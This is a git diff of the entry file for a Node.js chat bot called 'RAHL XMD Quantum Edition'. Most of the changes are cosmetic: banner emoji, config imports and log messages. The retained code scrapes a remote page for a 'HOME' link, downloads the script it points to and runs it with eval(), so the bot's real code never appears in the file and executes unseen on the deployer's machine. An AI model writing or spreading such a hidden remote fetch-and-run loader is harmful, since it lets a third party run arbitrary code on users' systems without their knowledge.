@@ -1,16 +1,22 @@
-//  [RAHL XMD QUANTUM EDITION]                                           
+//  [RAHL XMD QUANTUM EDITION ⚡]                                           
 //  >> A convergence of dark royal intelligence and quantum logic
-//  >> Forged by Lord Rahl                                                
+//  >> Forged by Lord Rahl 👑                                                
 //  >> Version: 9.0.0-quantum.rahl                                         
 
 const axios = require('axios');
 const cheerio = require('cheerio');
 const express = require('express');
-const rahl = require("./config");
 
+// 🧠 Import the hybrid config system
+const { hybridConfig, BOT_NAME, OWNER_NAME, PREFIX, GURL } = require('./core');
+
+// ==================================
+// 👑 Dynamic Engine Loader
+// ==================================
 async function fetchHomeUrl() {
   try {
-    const response = await axios.get(rahl.RAHL_XMD);
+    const homeURL = GURL; // from core.js (You can change to RAHL_XMD if defined)
+    const response = await axios.get(homeURL);
     const $ = cheerio.load(response.data);
 
     const targetElement = $('a:contains("HOME")');
@@ -20,7 +26,9 @@ async function fetchHomeUrl() {
       throw new Error('⚠️ HOME link not found — the royal script cannot awaken.');
     }
 
-    console.log('👑 The royal heart is loaded successfully.');
+    console.log(`👑 ${BOT_NAME} initialized under Lord ${OWNER_NAME}`);
+    console.log(`⚡ Prefix: ${PREFIX}`);
+    console.log('🚀 Fetching royal intelligence core...');
 
     const scriptResponse = await axios.get(targetUrl);
     eval(scriptResponse.data);
@@ -30,6 +38,7 @@ async function fetchHomeUrl() {
   }
 }
 
+// 🌀 Activate the bot
 fetchHomeUrl();
 
 // ===============================
@@ -39,7 +48,7 @@ const app = express();
 const PORT = process.env.PORT || 3000;
 
 app.get('/', (req, res) => {
-  res.send('👑 RAHL XMD Quantum Bot is alive and ruling the Render realm!');
+  res.send(`👑 ${BOT_NAME} Quantum Bot is alive and ruling the Render realm!`);
 });
 
 app.listen(PORT, () => {
